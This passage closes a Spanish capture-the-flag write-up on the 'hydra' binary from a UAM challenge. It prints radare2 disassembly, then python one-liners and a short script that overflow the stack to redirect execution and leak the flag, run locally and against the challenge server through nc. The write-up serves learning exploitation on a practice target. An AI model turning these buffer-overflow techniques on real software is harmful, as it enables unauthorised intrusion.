+											| sub esp, 0xc              |   | ; CODE XREF from sym.read_flag (0x8414392)   |                                  
+											| ; int status              |   | mov eax, dword [src]                         |                                  
+											| ; 1                       |   | sub esp, 8                                   |                                  
+											| push 1                    |   | ; const char *src                            |                                  
+											| ; void exit(int status)   |   | push eax                                     |                                  
+											| call sym.imp.exit;[gf]    |   | ; 0x84160a0                                  |                                  
+											`---------------------------'   | mov eax, obj.flag                            |                                  
+																			| ; char *dest                                 |                                  
+																			| push eax                                     |                                  
+																			| ; char *strcpy(char *dest, const char *src)  |                                  
+																			| call sym.imp.strcpy;[gk]                     |                                  
+																			| add esp, 0x10                                |                                  
+																			| sub esp, 0xc                                 |                                  
+																			| ; FILE *stream                               |                                  
+																			| push dword [stream]                          |                                  
+																			| ; int fclose(FILE *stream)                   |                                  
+																			| call sym.imp.fclose;[gl]                     |                                  
+																			| add esp, 0x10                                |                                  
+																			| nop                                          |                                  
+																			| mov ebx, dword [local_4h]                    |                                  
+																			| leave                                        |                                  
+																			| ret                                          |                                  
+																			`----------------------------------------------'  
+
+	Para automatizar las pruebas hay varias opciones, lo haremos de manera que podamos probar contra el ejecutable local y cambiarlo para la conexión remota del servidor de hydra.
+		python -c 'print 65536; print "A"*20 + "B"*4 + "C"*4 + "D"*4' | ./hydra
+	Con la solución final en este writeup, veremos otras opciones que podríamos utilizar, usando solamente python y redirigiendo su salida.
+
+	Utilizamos la llamada a sym.a ya que durante la ejecución del programa no se utiliza.
+	[0x084142cd]> VV @ sym.a (nodes 1 edges 0 zoom 100%) BB-NORM mouse:canvas-y mov-speed:5
+		 .----------------------------------------.                                          
+		 | [0x84142cd]                            |                                          
+		 | (fcn) sym.a 74                         |                                          
+		 |   sym.a (int arg_8h);                  |                                          
+		 | ; var int local_4h @ ebp-0x4           |                                          
+		 | ; arg int arg_8h @ ebp+0x8             |                                          
+		 | push ebp                               |                                          
+		 | mov ebp, esp                           |                                          
+		 | push ebx                               |                                          
+		 | sub esp, 4                             |                                          
+		 | call sym.__x86.get_pc_thunk.bx;[ga]    |                                          
+		 | add ebx, 0x1d27                        |                                          
+		 | sub esp, 0xc                           |                                          
+		 | lea eax, dword [ebx - 0x1aef]          |                                          
+		 | push eax                               |                                          
+		 | ; int puts(const char *s)              |                                          
+		 | call sym.imp.puts;[gb]                 |                                          
+		 | add esp, 0x10                          |                                          
+		 | sub esp, 0xc                           |                                          
+		 | push dword [arg_8h]                    |                                          
+		 | ; int printf(const char *format)       |                                          
+		 | call sym.imp.printf;[gc]               |                                          
+		 | add esp, 0x10                          |                                          
+		 | sub esp, 0xc                           |                                          
+		 | lea eax, dword [ebx - 0x1ae0]          |                                          
+		 | push eax                               |                                          
+		 | ; int printf(const char *format)       |                                          
+		 | call sym.imp.printf;[gc]               |                                          
+		 | add esp, 0x10                          |                                          
+		 | nop                                    |                                          
+		 | mov ebx, dword [local_4h]              |                                          
+		 | leave                                  |                                          
+		 | ret                                    |                                          
+		 `----------------------------------------'  
+		Intentamos modificar el flow de ejecución del programa hydra para que llegue a esa función sym.a
+		Al ejecutarlo aparece un nuevo mensaje, que ya habíamos revisado con los strings del radare2:
+		
+		Para las direcciones de memoria, al ser little endian, los ponemos al revés, por lo que la dirección 0x084142cd de la función sym.a la transformamos para el BOF a "\xcd\x42\x41\x08"
+		root:~# python -c 'print 65536; print "A"*20+"\xcd\x42\x41\x08"' | ./hydra
+			Bienvenido al sistema de reclutamiento de agentes.
+			¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+			Edad: 0
+			Parece que tienes madera de agente... hagamos una ultima comprobacion...
+			Cuentame el secreto y yo te contare el mio: 
+			Buen trabajo!
+			�Ė�
+			Segmentation fault
+		
+		Intentamos añadir otra dirección de memoria para ver como sería la respuesta.
+		root:~# python -c 'print 65536; print "A"*20+"\xcd\x42\x41\x08\xce\x42\x41\x08"' | ./hydra
+			Bienvenido al sistema de reclutamiento de agentes.
+			¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+			Edad: 0
+			Parece que tienes madera de agente... hagamos una ultima comprobacion...
+			Cuentame el secreto y yo te contare el mio: 
+			Buen trabajo!
+			�BAAAAAAAAAAAA�BA
+			Agente!
+			Buen trabajo!
+			Segmentation fault
+
+	Despues de intentar saltar a todas las funciones, intentamos escribir el eip, añadiendo 4 nops, pero las llamadas a funciones no están haciendo nada, por lo que tendremos que ir a buscar algo que pueda estar solamente en remoto y no en nuestro fichero.
+	Ahora sabemos que debemos sacar datos remotos, por lo que el único sitio donde hay un dato que podría variar es la flag.txt, por lo que vamos a revisar la función de sym.read_flag para intentar averiguar donde podría estar la dirección de memoria donde guardan el texto. Que será obj.flag
+	[0x08414317]> VV @ sym.read_flag (nodes 5 edges 4 zoom 100%) BB-NORM mouse:canvas-y mov-speed:5
+
+					   .-------------------------------------------------------.                                                                          
+					   | [0x8414317]                                           |                                                                          
+					   | (fcn) sym.read_flag 177                               |                                                                          
+					   |   sym.read_flag ();                                   |                                                                          
+					   | ; var int local_18h @ ebp-0x18                        |                                                                          
+					   | ; var char *src @ ebp-0x14                            |                                                                          
+					   | ; var unsigned int local_10h @ ebp-0x10               |                                                                          
+					   | ; var file*stream @ ebp-0xc                           |                                                                          
+					   | ; var int local_4h @ ebp-0x4                          |                                                                          
+					   | ; CALL XREF from main (0x84143e5)                     |                                                                          
+					   | push ebp                                              |                                                                          
+					   | mov ebp, esp                                          |                                                                          
+					   | push ebx                                              |                                                                          
+					   | sub esp, 0x14                                         |                                                                          
+					   | call sym.__x86.get_pc_thunk.bx;[ga]                   |                                                                          
+					   | add ebx, 0x1cdd                                       |                                                                          
+					   | mov dword [src], 0                                    |                                                                          
+					   | mov dword [local_18h], 0                              |                                                                          
+					   | sub esp, 8                                            |                                                                          
+					   | lea eax, dword [ebx - 0x1ad7]                         |                                                                          
+					   | ; const char *mode                                    |                                                                          
+					   | push eax                                              |                                                                          
+					   | lea eax, dword [ebx - 0x1ad5]                         |                                                                          
+					   | ; const char *filename                                |                                                                          
+					   | push eax                                              |                                                                          
+					   | ; file*fopen(const char *filename, const char *mode)  |                                                                          
+					   | call sym.imp.fopen;[gb]                               |                                                                          
+					   | add esp, 0x10                                         |                                                                          
+					   | mov dword [stream], eax                               |                                                                          
+					   | cmp dword [stream], 0                                 |                                                                          
+					   | jne 0x8414375;[gc]                                    |                                                                          
+					   `-------------------------------------------------------'                                                                          
+							   f t                                                                                                                        
+							   | |                                                                                                                        
+							   | '----------------------.                                                                                                 
+			.------------------'                        |                                                                                                 
+			|                                           |                                                                                                 
+		.--------------------------------------.    .--------------------------------------------.                                                        
+		|  0x8414359 [gg]                      |    |  0x8414375 [gc]                            |                                                        
+		| sub esp, 0xc                         |    | ; CODE XREF from sym.read_flag (0x8414357) |                                                        
+		| lea eax, dword [ebx - 0x1acc]        |    | sub esp, 4                                 |                                                        
+		| ; const char *format                 |    | push dword [stream]                        |        
+		| call sym.imp.printf;[ge]             |    | lea eax, dword [src]                       |                                                        
+		| add esp, 0x10                        |    | push eax                                   |                                                        
+		| sub esp, 0xc                         |    | call sym.imp.getline;[gh]                  |                                                        
+		| ; int status                         |    | add esp, 0x10                              |                                                        
+		| ; 1                                  |    | mov dword [local_10h], eax                 |                                                        
+		| push 1                               |    | cmp dword [local_10h], -1                  |                                                        
+		| ; void exit(int status)              |    | jne 0x841439e;[gi]                         |                                                        
+		| call sym.imp.exit;[gf]               |    `--------------------------------------------'                                                        
+		`--------------------------------------'            f t                                                                                           
+															| |                                                                                           
+															| |                                                                                           
+															| '-------------.                                                                             
+											.---------------'               |                                                                             
+											|                               |                                                                             
+										.---------------------------.   .----------------------------------------------.                                  
+										|  0x8414394 [gj]           |   |  0x841439e [gi]                              |                                  
+										| sub esp, 0xc              |   | ; CODE XREF from sym.read_flag (0x8414392)   |                                  
+										| ; int status              |   | mov eax, dword [src]                         |                                  
+										| ; 1                       |   | sub esp, 8                                   |                                  
+										| push 1                    |   | ; const char *src                            |                                  
+										| ; void exit(int status)   |   | push eax                                     |                                  
+										| call sym.imp.exit;[gf]    |   | ; 0x84160a0                                  |                                  
+										`---------------------------'   | mov eax, obj.flag                            | <-- lugar donde estará la flag leida del fichero flag.txt con dirección de memoria 0x084160a0
+																		| ; char *dest                                 |                                  
+																		| push eax                                     |                                  
+																		| ; char *strcpy(char *dest, const char *src)  |                                  
+																		| call sym.imp.strcpy;[gk]                     |                                  
+																		| add esp, 0x10                                |                                  
+																		| sub esp, 0xc                                 |                                  
+																		| ; FILE *stream                               |                                  
+																		| push dword [stream]                          |                                  
+																		| ; int fclose(FILE *stream)                   |                                  
+																		| call sym.imp.fclose;[gl]                     |                                  
+																		| add esp, 0x10                                |                                  
+																		| nop                                          |                                  
+																		| mov ebx, dword [local_4h]                    |                                  
+																		| leave                                        |                                  
+																		| ret                                          |                                  
+																		`----------------------------------------------'        
+	Ejecutamos varias opciones contra el fichero local hasta que llegamos a esta:
+		root:~# python -c 'print 65536; print "A"*20+"\xcd\x42\x41\x08"+"\x90"*4+"\xa0\x60\x41\x08"' | ./hydra
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+		Edad: 0
+		Parece que tienes madera de agente... hagamos una ultima comprobacion...
+		Cuentame el secreto y yo te contare el mio: 
+		Buen trabajo!
+		UAM{EstaNoEsLaFlag}
+		Segmentation fault
+
+	BIEN!!!! ahora podemos ir al servidor remoto y ver si este bufferoverflow funciona en remoto y conseguimos la verdadera flag.
+	Ejecutándolo en el servidor remoto de hydra 
+		root:~# python -c 'print 65536; print "A"*20+"\xcd\x42\x41\x08"+"\x90"*4+"\xa0\x60\x41\x08"' | nc 34.247.69.86 9009
+		65536
+		AAAAAAAAAAAAAAAAAAAA�BA^H�����`A^H
+
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+		Edad: 0
+		Parece que tienes madera de agente... hagamos una ultima comprobacion...
+		Cuentame el secreto y yo te contare el mio: 
+		Buen trabajo!
+		UAM{f2d593fa4eb0cd1860ed80fb0f7236ca}
+	YUHU!!!
+		
+	Otra opción que estaba haciéndolo todo en python, utilizando pack para que usase el littleendian < con unsigned int I, así evitar tener que transformarlo a mano. 
+	cat python_hydra.py
+		import sys
+		from struct import pack
+
+		age_check = "65536"
+		syma_address = 0x084142cd
+		flag_address = 0x084160a0
+
+		#explotamos un buffer overflow para leer el fichero flag.txt remoto
+		exploit = "A" * 20
+		exploit += pack("<I", syma_address)
+		exploit += "\x90"*4
+		exploit += pack("<I", flag_address)
+
+		#solo funciona en local, no en el servidor remoto de hydra
+		#sys.stdout.write(age_check)
+		#sys.stdout.write(exploit)
+
+		#asi funciona en local y remoto
+		print age_check
+		print exploit
+
+	Lo ejecutaríamos redirigiendo el output al fichero local o al nc del servidor remoto.
+		python python_hydra.py | ./hydra
+		python python_hydra.py | nc 34.247.69.86 9009
+
+		65536
+		AAAAAAAAAAAAAAAAAAAA�BA^H�����`A^H
+
+		Bienvenido al sistema de reclutamiento de agentes.
+		¡Veamos si tienes lo que hay que tener para ser parte de Hydra!
+
+		Edad: 0
+		Parece que tienes madera de agente... hagamos una ultima comprobacion...
+		Cuentame el secreto y yo te contare el mio: 
+		Buen trabajo!
+		UAM{f2d593fa4eb0cd1860ed80fb0f7236ca}
+
+
+	La última opción pasaba por usar la librería pwntools de pyton, para intentar automatizar encontrar las direcciones de memoria necesarias para sacar una shell remota, pero no llegué a conseguirlo :( por lo que no pongo más que el parte del fichero.
+	cat python_hydra_pwn.py
+		from pwn import *
+		context(arch='i386', os='linux')
+		binary = ELF("hydra_uam")
+		libc = ELF("libc.so.6")
+		hydra=process("./hydra")
+		hydra.interactive()
+
+Metemos la flag en el portal, puesto 11
+La primera parte ha sido muy rápida, y la segunda con las fiestas es la que ha dado más guerra.
+Finalmente la parte de intentar sacar un shell, es donde más cosas interesantes he visto, entendiendo mejor todo lo que hay detrás del buffer overflow, del stack y de la ejecución de los programas.
+
+
+Gracias a los admin por la prueba, y enhorabuena a todos los que han pasado la prueba.
+masi.
+
+-------------------------------------------------------------------------------
+Lectura recomendada:
+	https://github.com/Bretley/how2exploit_binary/tree/master/exercise-4
+	https://bitvijays.github.io/LFC-BinaryExploitation.html
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
+WRITE-UP 2018-12-28 EOF.
+-------------------------------------------------------------------------------
+-------------------------------------------------------------------------------
